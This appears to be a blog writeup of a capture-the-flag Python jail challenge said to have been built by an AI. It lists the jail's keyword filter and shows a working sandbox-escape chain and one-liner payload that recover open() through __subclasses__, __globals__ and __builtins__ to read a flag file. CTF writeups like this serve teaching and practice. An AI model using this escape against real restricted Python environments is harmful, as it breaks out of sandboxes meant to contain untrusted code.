@@ -1,0 +1,186 @@
+<!doctype html><html lang=en><head><title>misc,CyCTF-Luxor - sonnet-jail · z3r0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="z3r0s"><meta name=description content="
+  Sonnet Jail - Writeup
+  
+    
+    Link to heading
+  
+
+
+  Challenge
+  
+    
+    Link to heading
+  
+
+
+Name: Sonnet Jail
+Category: Misc / PyJail
+Description: &#34;I told Sonnet create me a creative pyjail even you can't solve, does it make the job?&#34;
+Goal: Read ./flag.txt
+
+
+  Reconnaissance
+  
+    
+    Link to heading
+  
+
+Connecting to the service presents a Python REPL with several restrictions:
+>>> print(1+1)
+2
+>>> print(open(&#34;flag.txt&#34;).read())
+[blocked] no dots
+>>> print(open(&#34;flag&#34; + chr(46) + &#34;txt&#34;))
+[blocked] 'open' is blocked
+
+  Blocked keywords
+  
+    
+    Link to heading
+  
+
+
+  
+      
+          Keyword
+          Message
+      
+  
+  
+      
+          . (dot character)
+          no dots
+      
+      
+          open
+          'open' is blocked
+      
+      
+          eval
+          'eval' is blocked
+      
+      
+          exec
+          'exec' is blocked
+      
+      
+          dir
+          'dir' is blocked
+      
+      
+          getattr
+          'getattr' is blocked
+      
+      
+          hasattr / setattr / delattr
+          blocked
+      
+      
+          __builtins__
+          blocked
+      
+      
+          __import__
+          blocked
+      
+      
+          globals
+          blocked
+      
+      
+          breakpoint
+          blocked
+      
+      
+          compile
+          blocked
+      
+      
+          input
+          blocked
+      
+      
+          __subclasses__
+          blocked string
+      
+      
+          __init__
+          blocked string
+      
+      
+          flag
+          blocked string
+      
+  
+
+
+  Allowed builtins
+  
+    
+    Link to heading
+  
+
+print, type, chr, isinstance, vars, list, map, filter, zip, object, bytes, int, str, range, enumerate, len, tuple, set, dict, frozenset, hex, oct, ord, bin, abs, round, sorted, reversed, min, max, sum, any, all, bool, float, complex, super, staticmethod, classmethod, property, slice, memoryview, bytearray"><meta name=keywords content="hackthebox,htb,ctf,writeup,cybersecurity,hacking,pentesting,redteam"><meta name=twitter:card content="summary"><meta name=twitter:title content="misc,CyCTF-Luxor - sonnet-jail"><meta name=twitter:description content="Sonnet Jail - WriteupLink to headingChallengeLink to headingName: Sonnet Jail Category: Misc / PyJail Description: &#34;I told Sonnet create me a creative pyjail even you can't solve, does it make the job?&#34; Goal: Read ./flag.txt ReconnaissanceLink to headingConnecting to the service presents a Python REPL with several restrictions:
+>>> print(1+1)2>>> print(open(&#34;flag.txt&#34;).read())[blocked] no dots>>> print(open(&#34;flag&#34; + chr(46) + &#34;txt&#34;))[blocked] 'open' is blocked Blocked keywordsLink to headingKeyword Message . (dot character) no dots open 'open' is blocked eval 'eval' is blocked exec 'exec' is blocked dir 'dir' is blocked getattr 'getattr' is blocked hasattr / setattr / delattr blocked __builtins__ blocked __import__ blocked globals blocked breakpoint blocked compile blocked input blocked __subclasses__ blocked string __init__ blocked string flag blocked string Allowed builtinsLink to headingprint, type, chr, isinstance, vars, list, map, filter, zip, object, bytes, int, str, range, enumerate, len, tuple, set, dict, frozenset, hex, oct, ord, bin, abs, round, sorted, reversed, min, max, sum, any, all, bool, float, complex, super, staticmethod, classmethod, property, slice, memoryview, bytearray"><meta property="og:url" content="https://z3r0s6.github.io/challenges/misccyctf-luxor-sonnet-jail/"><meta property="og:site_name" content="z3r0s"><meta property="og:title" content="misc,CyCTF-Luxor - sonnet-jail"><meta property="og:description" content="Sonnet Jail - WriteupLink to headingChallengeLink to headingName: Sonnet Jail Category: Misc / PyJail Description: &#34;I told Sonnet create me a creative pyjail even you can't solve, does it make the job?&#34; Goal: Read ./flag.txt ReconnaissanceLink to headingConnecting to the service presents a Python REPL with several restrictions:
+>>> print(1+1)2>>> print(open(&#34;flag.txt&#34;).read())[blocked] no dots>>> print(open(&#34;flag&#34; + chr(46) + &#34;txt&#34;))[blocked] 'open' is blocked Blocked keywordsLink to headingKeyword Message . (dot character) no dots open 'open' is blocked eval 'eval' is blocked exec 'exec' is blocked dir 'dir' is blocked getattr 'getattr' is blocked hasattr / setattr / delattr blocked __builtins__ blocked __import__ blocked globals blocked breakpoint blocked compile blocked input blocked __subclasses__ blocked string __init__ blocked string flag blocked string Allowed builtinsLink to headingprint, type, chr, isinstance, vars, list, map, filter, zip, object, bytes, int, str, range, enumerate, len, tuple, set, dict, frozenset, hex, oct, ord, bin, abs, round, sorted, reversed, min, max, sum, any, all, bool, float, complex, super, staticmethod, classmethod, property, slice, memoryview, bytearray"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="challenges"><meta property="article:published_time" content="2026-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-10T00:00:00+00:00"><meta property="article:tag" content="CyCTF-Luxor"><meta property="article:tag" content="Misc"><link rel=canonical href=https://z3r0s6.github.io/challenges/misccyctf-luxor-sonnet-jail/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f6b1b35a7b02521b25338f6cf58975f9980a6c12847763fe35a48307758cd1e7.css integrity="sha256-9rGzWnsCUhslM49s9Yl1+ZgKbBKEd2P+NaSDB3WM0ec=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css integrity="sha256-rUj0didZdIhb3APVJR482+FnjFSmP/dyN2sO0q3EaN0=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-dark"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://z3r0s6.github.io/>z3r0s
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Posts</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://z3r0s6.github.io/challenges/misccyctf-luxor-sonnet-jail/>misc,CyCTF-Luxor - sonnet-jail</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-05-10T00:00:00Z>May 10, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+3-minute read</span></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/machineschallenges/>Machines&amp;Challenges</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/cyctf-luxor/>CyCTF-Luxor</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/misc/>Misc</a></span></div></div></header><div class=post-content><h1 id=sonnet-jail---writeup>Sonnet Jail - Writeup
+<a class=heading-link href=#sonnet-jail---writeup><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><h2 id=challenge>Challenge
+<a class=heading-link href=#challenge><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><strong>Name:</strong> Sonnet Jail</li><li><strong>Category:</strong> Misc / PyJail</li><li><strong>Description:</strong> "I told Sonnet create me a creative pyjail even you can't solve, does it make the job?"</li><li><strong>Goal:</strong> Read <code>./flag.txt</code></li></ul><h2 id=reconnaissance>Reconnaissance
+<a class=heading-link href=#reconnaissance><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Connecting to the service presents a Python REPL with several restrictions:</p><pre tabindex=0><code>&gt;&gt;&gt; print(1+1)
+2
+&gt;&gt;&gt; print(open(&#34;flag.txt&#34;).read())
+[blocked] no dots
+&gt;&gt;&gt; print(open(&#34;flag&#34; + chr(46) + &#34;txt&#34;))
+[blocked] &#39;open&#39; is blocked
+</code></pre><h3 id=blocked-keywords>Blocked keywords
+<a class=heading-link href=#blocked-keywords><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><table><thead><tr><th>Keyword</th><th>Message</th></tr></thead><tbody><tr><td><code>.</code> (dot character)</td><td><code>no dots</code></td></tr><tr><td><code>open</code></td><td><code>'open' is blocked</code></td></tr><tr><td><code>eval</code></td><td><code>'eval' is blocked</code></td></tr><tr><td><code>exec</code></td><td><code>'exec' is blocked</code></td></tr><tr><td><code>dir</code></td><td><code>'dir' is blocked</code></td></tr><tr><td><code>getattr</code></td><td><code>'getattr' is blocked</code></td></tr><tr><td><code>hasattr</code> / <code>setattr</code> / <code>delattr</code></td><td>blocked</td></tr><tr><td><code>__builtins__</code></td><td>blocked</td></tr><tr><td><code>__import__</code></td><td>blocked</td></tr><tr><td><code>globals</code></td><td>blocked</td></tr><tr><td><code>breakpoint</code></td><td>blocked</td></tr><tr><td><code>compile</code></td><td>blocked</td></tr><tr><td><code>input</code></td><td>blocked</td></tr><tr><td><code>__subclasses__</code></td><td><code>blocked string</code></td></tr><tr><td><code>__init__</code></td><td><code>blocked string</code></td></tr><tr><td><code>flag</code></td><td><code>blocked string</code></td></tr></tbody></table><h3 id=allowed-builtins>Allowed builtins
+<a class=heading-link href=#allowed-builtins><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p><code>print</code>, <code>type</code>, <code>chr</code>, <code>isinstance</code>, <code>vars</code>, <code>list</code>, <code>map</code>, <code>filter</code>, <code>zip</code>, <code>object</code>, <code>bytes</code>, <code>int</code>, <code>str</code>, <code>range</code>, <code>enumerate</code>, <code>len</code>, <code>tuple</code>, <code>set</code>, <code>dict</code>, <code>frozenset</code>, <code>hex</code>, <code>oct</code>, <code>ord</code>, <code>bin</code>, <code>abs</code>, <code>round</code>, <code>sorted</code>, <code>reversed</code>, <code>min</code>, <code>max</code>, <code>sum</code>, <code>any</code>, <code>all</code>, <code>bool</code>, <code>float</code>, <code>complex</code>, <code>super</code>, <code>staticmethod</code>, <code>classmethod</code>, <code>property</code>, <code>slice</code>, <code>memoryview</code>, <code>bytearray</code></p><h2 id=key-observations>Key Observations
+<a class=heading-link href=#key-observations><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ol><li><strong>No dots</strong> = no attribute access via <code>.</code> syntax</li><li><strong><code>vars()</code> is allowed</strong> = can access <code>__dict__</code> of any object via <code>vars(obj)["key"]</code>, effectively replacing <code>getattr()</code></li><li><strong>String concatenation bypasses keyword filters</strong> = <code>"__" + "init" + "__"</code> is not caught by the filter looking for <code>__init__</code></li><li><strong><code>chr()</code> bypasses character/string filters</strong> = <code>chr(102)+chr(108)+chr(97)+chr(103)</code> produces <code>"flag"</code> without the literal appearing in source</li></ol><h2 id=exploit-chain>Exploit Chain
+<a class=heading-link href=#exploit-chain><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=step-1---get-object__subclasses__-without-dots-or-blocked-strings>Step 1 - Get <code>object.__subclasses__()</code> without dots or blocked strings
+<a class=heading-link href=#step-1---get-object__subclasses__-without-dots-or-blocked-strings><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>vars(type)[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;subclasses&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>](object)
+</span></span></code></pre></div><p><code>vars(type)</code> returns <code>type.__dict__</code>, from which we grab <code>__subclasses__</code> (a descriptor) and call it on <code>object</code>.</p><h3 id=step-2---find-os_wrap_close-index-142>Step 2 - Find <code>os._wrap_close</code> (index 142)
+<a class=heading-link href=#step-2---find-os_wrap_close-index-142><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>sc <span style=color:#ff7b72;font-weight:700>=</span> vars(type)[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;subclasses&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>](object)
+</span></span><span style=display:flex><span>wc <span style=color:#ff7b72;font-weight:700>=</span> sc[<span style=color:#a5d6ff>142</span>]  <span style=color:#8b949e;font-style:italic># &lt;class &#39;os._wrap_close&#39;&gt;</span>
+</span></span></code></pre></div><h3 id=step-3---traverse-to-__builtins__-via-__init____globals__>Step 3 - Traverse to <code>__builtins__</code> via <code>__init__.__globals__</code>
+<a class=heading-link href=#step-3---traverse-to-__builtins__-via-__init____globals__><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>init <span style=color:#ff7b72;font-weight:700>=</span> vars(wc)[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;init&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>]
+</span></span></code></pre></div><p>To access <code>init.__globals__</code> without dots or <code>getattr</code>, we use <code>object.__getattribute__</code> (not keyword-blocked):</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>ga <span style=color:#ff7b72;font-weight:700>=</span> vars(object)[<span style=color:#a5d6ff>&#34;__getattribute__&#34;</span>]
+</span></span><span style=display:flex><span>g <span style=color:#ff7b72;font-weight:700>=</span> ga(init, <span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;globals&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>)
+</span></span></code></pre></div><h3 id=step-4---recover-open-from-__builtins__>Step 4 - Recover <code>open</code> from <code>__builtins__</code>
+<a class=heading-link href=#step-4---recover-open-from-__builtins__><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>b <span style=color:#ff7b72;font-weight:700>=</span> g[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;builtins&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>]
+</span></span><span style=display:flex><span>o <span style=color:#ff7b72;font-weight:700>=</span> b[<span style=color:#a5d6ff>&#34;op&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;en&#34;</span>]
+</span></span></code></pre></div><h3 id=step-5---read-the-flag>Step 5 - Read the flag
+<a class=heading-link href=#step-5---read-the-flag><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Build <code>"flag.txt"</code> with <code>chr()</code> to avoid the blocked string <code>flag</code> and the blocked character <code>.</code>:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>fn <span style=color:#ff7b72;font-weight:700>=</span> chr(<span style=color:#a5d6ff>102</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>108</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>97</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>103</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>46</span>)<span style=color:#ff7b72;font-weight:700>+</span><span style=color:#a5d6ff>&#34;txt&#34;</span>  <span style=color:#8b949e;font-style:italic># &#34;flag.txt&#34;</span>
+</span></span><span style=display:flex><span>f <span style=color:#ff7b72;font-weight:700>=</span> o(fn)
+</span></span><span style=display:flex><span>print(ga(f, <span style=color:#a5d6ff>&#34;re&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;ad&#34;</span>)())
+</span></span></code></pre></div><h2 id=final-payload-one-liner>Final Payload (one-liner)
+<a class=heading-link href=#final-payload-one-liner><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span>sc <span style=color:#ff7b72;font-weight:700>=</span> vars(type)[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;subclasses&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>](object); wc <span style=color:#ff7b72;font-weight:700>=</span> sc[<span style=color:#a5d6ff>142</span>]; init <span style=color:#ff7b72;font-weight:700>=</span> vars(wc)[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;init&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>]; ga <span style=color:#ff7b72;font-weight:700>=</span> vars(object)[<span style=color:#a5d6ff>&#34;__getattribute__&#34;</span>]; g <span style=color:#ff7b72;font-weight:700>=</span> ga(init, <span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;globals&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>); b <span style=color:#ff7b72;font-weight:700>=</span> g[<span style=color:#a5d6ff>&#34;__&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;builtins&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;__&#34;</span>]; o <span style=color:#ff7b72;font-weight:700>=</span> b[<span style=color:#a5d6ff>&#34;op&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;en&#34;</span>]; fn <span style=color:#ff7b72;font-weight:700>=</span> chr(<span style=color:#a5d6ff>102</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>108</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>97</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>103</span>)<span style=color:#ff7b72;font-weight:700>+</span>chr(<span style=color:#a5d6ff>46</span>)<span style=color:#ff7b72;font-weight:700>+</span><span style=color:#a5d6ff>&#34;txt&#34;</span>; f <span style=color:#ff7b72;font-weight:700>=</span> o(fn); print(ga(f,<span style=color:#a5d6ff>&#34;re&#34;</span> <span style=color:#ff7b72;font-weight:700>+</span> <span style=color:#a5d6ff>&#34;ad&#34;</span>)())
+</span></span></code></pre></div><h2 id=flag>Flag
+<a class=heading-link href=#flag><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><pre tabindex=0><code>CyCTF{Xf6uHrmRdeqCv1stawLP4j376hZk9R1K0PYAqVQeRwONGIllyJ4ddCuv6e-PvmPkLunw6nCVbPha5C78kI-uOPAUqb91KtR_IK0}
+</code></pre><p><span id=no-password style=display:none>Z3R0S_NO_PASSWORD_PLEASE</span></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2025 -
+2026
+z3r0s
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
